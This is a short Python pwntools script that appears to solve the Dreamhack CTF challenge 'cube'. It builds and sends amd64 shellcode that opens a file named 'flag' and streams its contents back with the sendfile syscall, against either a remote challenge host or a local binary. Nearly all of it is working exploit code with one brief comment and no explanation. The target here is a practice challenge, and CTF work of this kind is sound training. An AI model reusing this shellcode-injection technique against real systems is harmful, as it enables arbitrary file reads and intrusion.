from pwn import *
from utils.pushstr import pushstr
elf = ELF('/home/kali/Downloads/dreamhack/cube/cube')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:17914'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#did they forget to call chdir()? that means that reading flag will be done from CWD

#gdb.attach(p, gdbscript='''
#catch syscall 1
#''')

shellcode_open = asm(f"""
mov rax, 2
{pushstr('flag')}

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx

syscall
""")

shellcode_sendfile = asm('''
mov rdi, 1
mov rsi, rax
xor rdx, rdx
mov r10, 0x30

mov rax, 40
syscall
''')

shellcode = shellcode_open + shellcode_sendfile
p.recvuntil(b": ")
p.sendline(shellcode)

p.interactive()
